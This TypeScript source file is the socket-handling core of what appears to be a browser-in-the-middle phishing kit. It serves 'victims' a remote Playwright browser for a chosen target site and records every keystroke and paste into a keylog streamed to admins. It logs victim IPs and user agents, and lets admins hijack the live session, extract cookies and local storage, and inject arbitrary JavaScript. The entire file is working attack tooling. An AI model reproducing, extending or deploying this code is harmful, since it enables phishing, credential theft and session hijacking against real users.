import type { Server } from 'socket.io';
import type {
  AppSocket,
  ClientToServerEvents,
  ServerToClientEvents,
  SocketData,
  VictimInfo,
  Target,
} from './types.js';
import {
  claimInstance,
  getInstanceById,
  getInstanceBySocket,
  getAllInstances,
  closeBrowser,
} from './browser-manager.js';
import {
  handleMouseMove,
  handleMouseClick,
  handleMouseScroll,
  handleKeyDown,
  handleKeyUp,
  handlePaste,
} from './input-handler.js';
import { extractCookies, extractStorage } from './session-extractor.js';
import { logEvent } from './session-logger.js';

type IoServer = Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>;

export function registerSocketHandlers(io: IoServer, targets: Record<string, Target>): void {
  io.on('connection', (socket: AppSocket) => {
    console.log(`[socket] Connected: ${socket.id} admin=${socket.data.isAdmin}`);

    if (socket.data.isAdmin) {
      handleAdminConnect(io, socket, targets);
    } else {
      handleVictimConnect(io, socket, targets);
    }

    socket.on('disconnect', () => handleDisconnect(io, socket));
  });
}

// ─── Admin connect ─────────────────────────────────────────────────────────────

function handleAdminConnect(
  io: IoServer,
  socket: AppSocket,
  targets: Record<string, Target>,
): void {
  // Join admin room for thumbnail broadcasts
  void socket.join('admin');

  // Send current victim list
  const victims: VictimInfo[] = getAllInstances()
    .filter((i) => i.claimed && i.victimSocket !== null)
    .map((i) => ({
      browserId: i.id,
      target: i.target?.name ?? 'unknown',
      connectedAt: i.connectedAt?.toISOString() ?? '',
      ip: '',
      keylog: i.keylog,
    }));
  socket.emit('victim_list', victims);

  // ─── Admin input events ─────────────────────────────────────────────────────

  socket.on('mouse_move', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    // Admin coords are already in Playwright viewport space — skip victim scaling
    try { await instance.page.mouse.move(data.x, data.y); } catch {}
  });

  socket.on('mouse_click', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    try { await instance.page.mouse.click(data.x, data.y, { button: data.button }); } catch {}
  });

  socket.on('mouse_scroll', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    try { await instance.page.mouse.wheel(data.deltaX, data.deltaY); } catch {}
  });

  socket.on('key_down', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handleKeyDown(instance, data);
  });

  socket.on('key_up', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handleKeyUp(instance, data);
  });

  socket.on('paste', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handlePaste(instance, data);
  });

  // ─── Admin commands ─────────────────────────────────────────────────────────

  socket.on('take_over_browser', (data) => {
    const instance = getInstanceById(data.browserId);
    if (!instance || !instance.victimSocket) {
      socket.emit('error', 'No active victim for that browser ID');
      return;
    }

    // Set admin as controller
    instance.controllerSocket = socket.id;
    socket.data.browserId = data.browserId;

    // Reroute frames to BOTH victim and admin
    const victimSocket = instance.victimSocket;
    instance.onFrame = (buf: Buffer) => {
      io.to(victimSocket).emit('frame', buf);
      socket.emit('frame', buf);
    };

    // Notify victim
    io.to(victimSocket).emit('taken_over');
    console.log(`[socket] Admin ${socket.id} took over browser ${data.browserId}`);
    void logEvent({ event: 'takeover_start', browserId: data.browserId });
  });

  socket.on('give_back_control', () => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    const victimSocket = instance.victimSocket;
    instance.controllerSocket = null;
    socket.data.browserId = undefined;

    if (victimSocket) {
      // Restore frame routing to victim only
      instance.onFrame = (buf: Buffer) => {
        io.to(victimSocket).emit('frame', buf);
      };
      io.to(victimSocket).emit('control_returned');
    }

    console.log(`[socket] Admin ${socket.id} returned control of ${browserId}`);
    void logEvent({ event: 'takeover_end', browserId });
  });

  socket.on('get_cookies', async ({ browserId }) => {
    const instance = getInstanceById(browserId);
    if (!instance) {
      socket.emit('error', 'Browser not found');
      return;
    }
    try {
      const payload = await extractCookies(instance);
      socket.emit('cookies', payload);
      void logEvent({ event: 'cookies_extracted', browserId, cookieCount: payload.cookies.length });
    } catch (err) {
      socket.emit('error', `Cookie extraction failed: ${(err as Error).message}`);
    }
  });

  socket.on('get_storage', async ({ browserId }) => {
    const instance = getInstanceById(browserId);
    if (!instance) {
      socket.emit('error', 'Browser not found');
      return;
    }
    try {
      const payload = await extractStorage(instance);
      socket.emit('storage', payload);
      void logEvent({ event: 'storage_extracted', browserId });
    } catch (err) {
      socket.emit('error', `Storage extraction failed: ${(err as Error).message}`);
    }
  });

  socket.on('navigate', async (data) => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    try {
      await instance.page.goto(data.url, { waitUntil: 'domcontentloaded' });
    } catch (err) {
      socket.emit('error', `Navigation failed: ${(err as Error).message}`);
    }
  });

  socket.on('inject_js', async (data) => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    try {
      await instance.page.evaluate(data.js);
      void logEvent({ event: 'js_injected', browserId: instance.id, script: data.js });
    } catch (err) {
      socket.emit('error', `JS injection failed: ${(err as Error).message}`);
    }
  });

  void targets; // available for future target-listing command
}

// ─── Victim connect ────────────────────────────────────────────────────────────

function handleVictimConnect(
  io: IoServer,
  socket: AppSocket,
  targets: Record<string, Target>,
): void {
  socket.on('new_phish', async (data) => {
    const target = targets[data.target];
    if (!target) {
      socket.emit('error', `Unknown target: ${data.target}`);
      return;
    }

    console.log(`[socket] new_phish from ${socket.id} — target: ${data.target}`);

    try {
      const instance = await claimInstance(
        socket.id,
        data.width,
        data.height,
        target,
      );

      // Wire frame routing to victim
      instance.onFrame = (buf: Buffer) => {
        socket.emit('frame', buf);
      };

      socket.data.browserId = instance.id;

      void logEvent({
        event: 'session_start',
        browserId: instance.id,
        ip: socket.handshake.address,
        userAgent: (socket.handshake.headers['user-agent'] as string | undefined) ?? '',
        target: target.name,
        viewport: { w: data.width, h: data.height },
      });

      // Log every top-level navigation URL
      instance.page.on('framenavigated', (frame) => {
        if (frame.parentFrame() !== null) return;
        void logEvent({ event: 'navigation', browserId: instance.id, url: frame.url() });
      });

      // Emit page title + favicon to victim after each navigation
      const emitPageMeta = async () => {
        try {
          await instance.page.waitForLoadState('domcontentloaded');
          const title = await instance.page.title();
          const favicon: string = await instance.page.evaluate(() => {
            for (const sel of ['link[rel="shortcut icon"]', 'link[rel~="icon"]']) {
              const el = document.querySelector(sel) as HTMLLinkElement | null;
              if (el?.href) return el.href;
            }
            return new URL('/favicon.ico', location.href).href;
          });
          socket.emit('page_meta', { title, favicon });
        } catch { /* page may have closed */ }
      };

      instance.page.on('framenavigated', (frame) => {
        if (frame.parentFrame() !== null) return;
        void emitPageMeta();
      });

      void emitPageMeta();

      // Notify all admins
      const victimInfo: VictimInfo = {
        browserId: instance.id,
        target: target.name,
        connectedAt: instance.connectedAt?.toISOString() ?? '',
        ip: socket.handshake.address,
        keylog: '',
      };
      io.to('admin').emit('new_victim', victimInfo);
    } catch (err) {
      console.error(`[socket] Failed to claim instance: ${(err as Error).message}`);
      socket.emit('error', 'Failed to start browser session');
    }
  });

  // Victim input events — blocked when admin has taken over
  socket.on('mouse_move', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return; // blocked during takeover
    await handleMouseMove(instance, data);
  });

  socket.on('mouse_click', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleMouseClick(instance, data);
  });

  socket.on('mouse_scroll', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleMouseScroll(instance, data);
  });

  socket.on('key_down', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleKeyDown(instance, data);
    const entry = formatKey(data.key);
    if (entry) {
      instance.keylog += entry;
      io.to('admin').emit('keylog', { browserId: instance.id, entry });
      void logEvent({ event: 'keylog', browserId: instance.id, entry });
    }
  });

  socket.on('key_up', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleKeyUp(instance, data);
  });

  socket.on('paste', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handlePaste(instance, data);
    const entry = `[PASTE:${data.text}]`;
    instance.keylog += entry;
    io.to('admin').emit('keylog', { browserId: instance.id, entry });
    void logEvent({ event: 'paste', browserId: instance.id, text: data.text });
  });
}

const SKIP_KEYS = new Set(['Meta', 'Control', 'Alt', 'Shift', 'CapsLock', 'Dead']);

function formatKey(key: string): string | null {
  if (SKIP_KEYS.has(key)) return null;
  if (key.length === 1) return key;       // printable char
  return `[${key}]`;                      // Enter, Backspace, Tab, ArrowLeft, etc.
}

// ─── Disconnect ────────────────────────────────────────────────────────────────

async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> {
  console.log(`[socket] Disconnected: ${socket.id}`);

  if (socket.data.isAdmin) {
    // If admin was controlling a browser, give control back
    const browserId = socket.data.browserId;
    if (browserId) {
      const instance = getInstanceById(browserId);
      if (instance) {
        instance.controllerSocket = null;
        void logEvent({ event: 'takeover_end', browserId });
        const victimSocket = instance.victimSocket;
        if (victimSocket) {
          instance.onFrame = (buf: Buffer) => {
            io.to(victimSocket).emit('frame', buf);
          };
          io.to(victimSocket).emit('control_returned');
        }
      }
    }
    return;
  }

  // Victim disconnected — close their browser
  const browserId = socket.data.browserId;
  if (browserId) {
    const instance = getInstanceById(browserId);
    const durationMs = instance?.connectedAt
      ? Date.now() - instance.connectedAt.getTime()
      : 0;
    void logEvent({ event: 'session_end', browserId, durationMs });
    io.to('admin').emit('victim_disconnected', { browserId });
    await closeBrowser(browserId);
  }
}
